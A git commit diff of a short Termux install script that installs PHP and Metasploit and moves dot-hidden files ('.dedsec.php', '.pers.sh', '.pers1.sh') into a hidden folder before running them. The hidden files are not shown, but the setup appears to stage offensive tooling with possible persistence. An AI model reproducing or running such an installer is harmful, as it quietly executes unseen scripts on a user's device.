11076cb8e598ce2866c53dd6c5df8ec276382725
ImJoke <55929550+ImJoke@users.noreply.github.com>
2020-10-09 00:41:26 +0700

    Update inst2.sh

--- inst2.sh
+++ inst2.sh
@@ -1,5 +1,5 @@
 pkg install php -y
-mkdir $HOME/.p/ && mv .dedsec.php $HOME/.p/ && mv .pers.sh $HOME/.p/ && mv .pers1.sh $HOME/.p/
-sh $HOME/.p/.pers.sh && sh $HOME/.p/.pers1.sh
+mkdir /data/data/com.termux/files/home/.p/ && mv .dedsec.php /data/data/com.termux/files/home/.p/ && mv .pers.sh /data/data/com.termux/files/home/.p/ && mv .pers1.sh /data/data/com.termux/files/home/.p/
+sh /data/data/com.termux/files/home/.p/.pers.sh && sh /data/data/com.termux/files/home/.p/.pers1.sh
 pkg install unstable-repo
 pkg install metasploit -y
